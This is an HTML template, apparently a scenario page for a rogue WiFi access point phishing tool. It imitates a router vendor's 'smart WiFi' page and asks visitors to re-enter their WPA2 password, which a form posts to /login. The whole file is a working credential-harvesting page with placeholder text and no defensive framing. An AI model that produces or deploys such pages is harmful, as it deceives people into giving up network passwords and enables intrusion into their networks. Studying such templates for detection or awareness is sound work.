<!DOCTYPE html>
<html lang="{{html_lang}}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{page_title}}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background: #f4f6f8; color: #1a1a2e; min-height: 100vh; }
        .bar { background: #fff; border-bottom: 1px solid #e0e4ea; padding: 12px 18px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 8px; }
        .logo-text { font-size: 22px; font-weight: 300; color: #00a0df; letter-spacing: 0.02em; }
        .logo-text span { font-weight: 700; }
        .badge { font-size: 10px; text-transform: uppercase; letter-spacing: 0.12em; color: #6b7280; }
        .shell { max-width: 640px; margin: 20px auto; padding: 0 16px; }
        .card { background: #fff; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 80, 130, 0.08); border: 1px solid #e8ecf1; overflow: hidden; }
        .card-h { padding: 16px 20px; border-bottom: 1px solid #e8ecf1; font-size: 15px; font-weight: 600; color: #00a0df; }
        .card-b { padding: 20px; }
        .alert { background: #e8f6fc; border: 1px solid #00a0df; border-radius: 8px; padding: 14px 16px; margin-bottom: 22px; font-size: 13px; line-height: 1.55; color: #1e4976; }
        .alert strong { display: block; color: #0077b5; margin-bottom: 6px; font-size: 14px; }
        .field { margin-bottom: 18px; }
        .field label { display: block; font-size: 12px; font-weight: 600; color: #4b5563; margin-bottom: 6px; }
        .hint { font-size: 11px; color: #9ca3af; margin-top: 4px; }
        input[type="password"] { width: 100%; padding: 12px 14px; border: 1px solid #d1d5db; border-radius: 8px; font-size: 15px; }
        input[type="password"]:focus { outline: none; border-color: #00a0df; box-shadow: 0 0 0 3px rgba(0, 160, 223, 0.2); }
        .meta { display: flex; flex-wrap: wrap; gap: 16px; margin-bottom: 8px; font-size: 12px; color: #6b7280; }
        .meta span { background: #f4f6f8; padding: 6px 10px; border-radius: 6px; }
        .btn-wrap { margin-top: 22px; }
        .btn { width: 100%; padding: 14px; background: #00a0df; color: #fff; border: none; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer; }
        .btn:hover { background: #0088c4; }
        @media (min-width: 480px) { .btn { width: auto; min-width: 160px; } }
        .nav-dots { display: flex; gap: 8px; justify-content: center; padding: 12px; }
        .nav-dots i { width: 6px; height: 6px; border-radius: 50%; background: #d1d5db; }
        .nav-dots i.on { background: #00a0df; }
        .foot { text-align: center; padding: 20px; font-size: 11px; color: #9ca3af; }
    </style>
</head>
<body>
    <div class="bar">
        <div class="logo-text">{{brand_link}}<span>{{brand_sys}}</span></div>
        <div class="badge">{{badge_smart_wifi}}</div>
    </div>
    <div class="nav-dots"><i></i><i class="on"></i><i></i></div>
    <div class="shell">
        <div class="card">
            <div class="card-h">{{card_title}}</div>
            <div class="card-b">
                <div class="alert">
                    <strong>{{alert_title}}</strong>
                    {{alert_body}}
                </div>
                <div class="meta">
                    <span>{{meta_wpa2}}</span><span>{{meta_aes}}</span>
                </div>
                <form method="POST" action="/login">
                    <div class="field">
                        <label for="wpa">{{label_wifi_password}}</label>
                        <input type="password" id="wpa" name="wfphshr-wpa-password" placeholder="{{input_placeholder}}" required autocomplete="current-password">
                        <div class="hint">{{hint_psk}}</div>
                    </div>
                    <div class="btn-wrap"><button type="submit" class="btn">{{btn_confirm}}</button></div>
                </form>
            </div>
        </div>
        <div class="foot">{{footer}}</div>
    </div>
</body>
</html>
